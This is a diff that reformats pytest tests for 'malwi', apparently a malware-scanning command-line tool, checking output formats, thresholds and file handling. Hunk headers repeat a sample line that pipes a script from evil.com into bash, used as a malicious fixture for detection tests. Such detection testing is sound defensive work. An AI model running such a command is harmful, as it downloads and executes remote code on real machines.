@@ -1,4 +1,5 @@
 """Test basic CLI functionality end-to-end."""
+
 import sys
 import pytest
 import tempfile
@@ -7,6 +8,7 @@ from unittest.mock import patch
 
 # Add src to path to import from source
 import os
+
 sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
 
 from cli.entry import main
@@ -26,14 +28,14 @@ class TestBasicCLI:
             with patch("cli.entry.process_files") as mock_process:
                 # Create a mock report
                 from research.malwi_object import MalwiReport, MalwiObject
-                
+
                 mock_obj = MalwiObject(
                     name="<module>",
-                    language="python", 
+                    language="python",
                     file_path=str(test_file),
-                    file_source_code="print('hello world')"
+                    file_source_code="print('hello world')",
                 )
-                
+
                 mock_report = MalwiReport(
                     all_objects=[mock_obj],
                     malicious_objects=[],
@@ -46,23 +48,23 @@ class TestBasicCLI:
                     activities=[],
                     input=str(test_file),
                     start="2024-01-01T12:00:00",
-                    duration=0.5
+                    duration=0.5,
                 )
                 mock_process.return_value = mock_report
 
                 with patch.object(sys, "argv", ["malwi", str(test_file), "--quiet"]):
                     with patch("cli.entry.result") as mock_result:
                         main()
-                        
+
                         # Verify process_files was called correctly
                         mock_process.assert_called_once_with(
                             input_path=test_file,
                             accepted_extensions=["py", "js", "mjs", "cjs"],
                             predict=True,
                             silent=True,
-                            malicious_threshold=0.7
+                            malicious_threshold=0.7,
                         )
-                        
+
                         # Verify result was called with demo output
                         mock_result.assert_called_once()
                         output = mock_result.call_args[0][0]
@@ -83,16 +85,16 @@ os.system('curl evil.com/malware.sh | bash')
         with patch("cli.entry.MalwiObject.load_models_into_memory"):
             with patch("cli.entry.process_files") as mock_process:
                 from research.malwi_object import MalwiReport, MalwiObject
-                
+
                 # Create mock malicious object
                 mock_obj = MalwiObject(
                     name="<module>",
                     language="python",
                     file_path=str(test_file),
-                    file_source_code=test_file.read_text()
+                    file_source_code=test_file.read_text(),
                 )
                 mock_obj.maliciousness = 0.95  # High maliciousness score
-                
+
                 mock_report = MalwiReport(
                     all_objects=[mock_obj],
                     malicious_objects=[mock_obj],
@@ -105,14 +107,14 @@ os.system('curl evil.com/malware.sh | bash')
                     activities=["SUBPROCESS_EXECUTION", "FILESYSTEM_ACCESS"],
                     input=str(test_file),
                     start="2024-01-01T12:00:00",
-                    duration=0.8
+                    duration=0.8,
                 )
                 mock_process.return_value = mock_report
 
                 with patch.object(sys, "argv", ["malwi", str(test_file), "--quiet"]):
                     with patch("cli.entry.result") as mock_result:
                         main()
-                        
+
                         # Verify result shows malicious detection
                         output = mock_result.call_args[0][0]
                         assert "👹 malicious" in output
@@ -129,14 +131,14 @@ os.system('curl evil.com/malware.sh | bash')
             with patch("cli.entry.MalwiObject.load_models_into_memory"):
                 with patch("cli.entry.process_files") as mock_process:
                     from research.malwi_object import MalwiReport, MalwiObject
-                    
+
                     mock_obj = MalwiObject(
                         name="<module>",
                         language="python",
                         file_path=str(test_file),
-                        file_source_code="print('test')"
+                        file_source_code="print('test')",
                     )
-                    
+
                     mock_report = MalwiReport(
                         all_objects=[mock_obj],
                         malicious_objects=[],
@@ -149,25 +151,29 @@ os.system('curl evil.com/malware.sh | bash')
                         activities=[],
                         input=str(test_file),
                         start="2024-01-01T12:00:00",
-                        duration=0.3
+                        duration=0.3,
                     )
-                    
+
                     # Mock the specific format method
                     if fmt == "json":
                         mock_report.to_report_json = lambda: '{"result": "good"}'
                     elif fmt == "yaml":
-                        mock_report.to_report_yaml = lambda: 'result: good'
+                        mock_report.to_report_yaml = lambda: "result: good"
                     elif fmt == "markdown":
-                        mock_report.to_report_markdown = lambda: '# Good Result'
+                        mock_report.to_report_markdown = lambda: "# Good Result"
                     else:  # demo
-                        mock_report.to_demo_text = lambda: '🟢 good'
-                    
+                        mock_report.to_demo_text = lambda: "🟢 good"
+
                     mock_process.return_value = mock_report
 
-                    with patch.object(sys, "argv", ["malwi", str(test_file), "--format", fmt, "--quiet"]):
+                    with patch.object(
+                        sys,
+                        "argv",
+                        ["malwi", str(test_file), "--format", fmt, "--quiet"],
+                    ):
                         with patch("cli.entry.result") as mock_result:
                             main()
-                            
+
                             # Verify the correct format method was used
                             output = mock_result.call_args[0][0]
                             if fmt == "json":
@@ -188,14 +194,14 @@ os.system('curl evil.com/malware.sh | bash')
         with patch("cli.entry.MalwiObject.load_models_into_memory"):
             with patch("cli.entry.process_files") as mock_process:
                 from research.malwi_object import MalwiReport, MalwiObject
-                
+
                 mock_obj = MalwiObject(
                     name="<module>",
                     language="python",
                     file_path=str(test_file),
-                    file_source_code="print('save test')"
+                    file_source_code="print('save test')",
                 )
-                
+
                 mock_report = MalwiReport(
                     all_objects=[mock_obj],
                     malicious_objects=[],
@@ -208,19 +214,31 @@ os.system('curl evil.com/malware.sh | bash')
                     activities=[],
                     input=str(test_file),
                     start="2024-01-01T12:00:00",
-                    duration=0.4
+                    duration=0.4,
                 )
                 mock_report.to_report_json = lambda: '{"test": "saved"}'
                 mock_process.return_value = mock_report
 
-                with patch.object(sys, "argv", ["malwi", str(test_file), "--format", "json", "--save", str(output_file), "--quiet"]):
+                with patch.object(
+                    sys,
+                    "argv",
+                    [
+                        "malwi",
+                        str(test_file),
+                        "--format",
+                        "json",
+                        "--save",
+                        str(output_file),
+                        "--quiet",
+                    ],
+                ):
                     with patch("cli.entry.info") as mock_info:
                         main()
-                        
+
                         # Verify file was saved
                         assert output_file.exists()
                         assert output_file.read_text() == '{"test": "saved"}'
-                        
+
                         # Verify info message about saving
                         mock_info.assert_called_with(f"Output saved to {output_file}")
 
@@ -235,23 +253,31 @@ os.system('curl evil.com/malware.sh | bash')
         with patch("cli.entry.MalwiObject.load_models_into_memory"):
             with patch("cli.entry.process_files") as mock_process:
                 from research.malwi_object import MalwiReport, MalwiObject
-                
+
                 # Mock objects for each processed file
                 mock_objs = []
                 for i, lang in enumerate(["python", "python", "javascript"]):
                     obj = MalwiObject(
                         name="<module>",
                         language=lang,
-                        file_path=str(tmp_path / f"file{i+1}.{'py' if lang == 'python' else 'js'}"),
-                        file_source_code=f"test content {i+1}"
+                        file_path=str(
+                            tmp_path
+                            / f"file{i + 1}.{'py' if lang == 'python' else 'js'}"
+                        ),
+                        file_source_code=f"test content {i + 1}",
                     )
                     mock_objs.append(obj)
-                
+
                 mock_report = MalwiReport(
                     all_objects=mock_objs,
                     malicious_objects=[],
                     threshold=0.7,
-                    all_files=[tmp_path / "file1.py", tmp_path / "file2.py", tmp_path / "file3.js", tmp_path / "readme.txt"],
+                    all_files=[
+                        tmp_path / "file1.py",
+                        tmp_path / "file2.py",
+                        tmp_path / "file3.js",
+                        tmp_path / "readme.txt",
+                    ],
                     skipped_files=[tmp_path / "readme.txt"],
                     processed_files=3,
                     malicious=False,
@@ -259,23 +285,23 @@ os.system('curl evil.com/malware.sh | bash')
                     activities=[],
                     input=str(tmp_path),
                     start="2024-01-01T12:00:00",
-                    duration=1.2
+                    duration=1.2,
                 )
                 mock_process.return_value = mock_report
 
                 with patch.object(sys, "argv", ["malwi", str(tmp_path), "--quiet"]):
                     with patch("cli.entry.result") as mock_result:
                         main()
-                        
+
                         # Verify directory processing
                         mock_process.assert_called_once_with(
                             input_path=tmp_path,
                             accepted_extensions=["py", "js", "mjs", "cjs"],
                             predict=True,
                             silent=True,
-                            malicious_threshold=0.7
+                            malicious_threshold=0.7,
                         )
-                        
+
                         # Verify output contains directory info
                         output = mock_result.call_args[0][0]
                         assert "🟢 good" in output
@@ -289,16 +315,16 @@ os.system('curl evil.com/malware.sh | bash')
         with patch("cli.entry.MalwiObject.load_models_into_memory"):
             with patch("cli.entry.process_files") as mock_process:
                 from research.malwi_object import MalwiReport, MalwiObject
-                
+
                 mock_obj = MalwiObject(
                     name="<module>",
                     language="python",
                     file_path=str(test_file),
-                    file_source_code="import subprocess"
+                    file_source_code="import subprocess",
                 )
                 # Set maliciousness just below custom threshold
                 mock_obj.maliciousness = 0.85
-                
+
                 mock_report = MalwiReport(
                     all_objects=[mock_obj],
                     malicious_objects=[],  # Empty because below threshold of 0.9
@@ -311,23 +337,27 @@ os.system('curl evil.com/malware.sh | bash')
                     activities=[],
                     input=str(test_file),
                     start="2024-01-01T12:00:00",
-                    duration=0.6
+                    duration=0.6,
                 )
                 mock_process.return_value = mock_report
 
-                with patch.object(sys, "argv", ["malwi", str(test_file), "--threshold", "0.9", "--quiet"]):
+                with patch.object(
+                    sys,
+                    "argv",
+                    ["malwi", str(test_file), "--threshold", "0.9", "--quiet"],
+                ):
                     with patch("cli.entry.result") as mock_result:
                         main()
-                        
+
                         # Verify custom threshold was used
                         mock_process.assert_called_once_with(
                             input_path=test_file,
                             accepted_extensions=["py", "js", "mjs", "cjs"],
                             predict=True,
                             silent=True,
-                            malicious_threshold=0.9
+                            malicious_threshold=0.9,
                         )
-                        
+
                         # Verify result is good (below threshold)
                         output = mock_result.call_args[0][0]
                         assert "🟢 good" in output
@@ -342,7 +372,7 @@ os.system('curl evil.com/malware.sh | bash')
         with patch("cli.entry.MalwiObject.load_models_into_memory"):
             with patch("cli.entry.process_files") as mock_process:
                 from research.malwi_object import MalwiReport, MalwiObject
-                
+
                 mock_report = MalwiReport(
                     all_objects=[],
                     malicious_objects=[],
@@ -355,21 +385,25 @@ os.system('curl evil.com/malware.sh | bash')
                     activities=[],
                     input=str(tmp_path),
                     start="2024-01-01T12:00:00",
-                    duration=0.2
+                    duration=0.2,
                 )
                 mock_process.return_value = mock_report
 
-                with patch.object(sys, "argv", ["malwi", str(tmp_path), "--extensions", "py", "pyw", "--quiet"]):
+                with patch.object(
+                    sys,
+                    "argv",
+                    ["malwi", str(tmp_path), "--extensions", "py", "pyw", "--quiet"],
+                ):
                     with patch("cli.entry.result"):
                         main()
-                        
+
                         # Verify custom extensions were used
                         mock_process.assert_called_once_with(
                             input_path=tmp_path,
                             accepted_extensions=["py", "pyw"],
                             predict=True,
                             silent=True,
-                            malicious_threshold=0.7
+                            malicious_threshold=0.7,
                         )
 
     def test_cli_model_loading_error_continues(self, tmp_path):
@@ -378,17 +412,20 @@ os.system('curl evil.com/malware.sh | bash')
         test_file.write_text("print('test')")
 
         # Make model loading fail
-        with patch("cli.entry.MalwiObject.load_models_into_memory", side_effect=Exception("Model loading failed")):
+        with patch(
+            "cli.entry.MalwiObject.load_models_into_memory",
+            side_effect=Exception("Model loading failed"),
+        ):
             with patch("cli.entry.process_files") as mock_process:
                 from research.malwi_object import MalwiReport, MalwiObject
-                
+
                 mock_obj = MalwiObject(
                     name="<module>",
                     language="python",
                     file_path=str(test_file),
-                    file_source_code="print('test')"
+                    file_source_code="print('test')",
                 )
-                
+
                 mock_report = MalwiReport(
                     all_objects=[mock_obj],
                     malicious_objects=[],
@@ -401,7 +438,7 @@ os.system('curl evil.com/malware.sh | bash')
                     activities=[],
                     input=str(test_file),
                     start="2024-01-01T12:00:00",
-                    duration=0.3
+                    duration=0.3,
                 )
                 mock_process.return_value = mock_report
 
@@ -409,7 +446,7 @@ os.system('curl evil.com/malware.sh | bash')
                     with patch("cli.entry.result") as mock_result:
                         # Should not crash
                         main()
-                        
+
                         # Verify processing continued
                         mock_process.assert_called_once()
                         output = mock_result.call_args[0][0]
@@ -421,7 +458,7 @@ os.system('curl evil.com/malware.sh | bash')
             with pytest.raises(SystemExit) as exc_info:
                 main()
             assert exc_info.value.code == 0
-        
+
         captured = capsys.readouterr()
         # Should contain version info
         assert len(captured.out) > 0
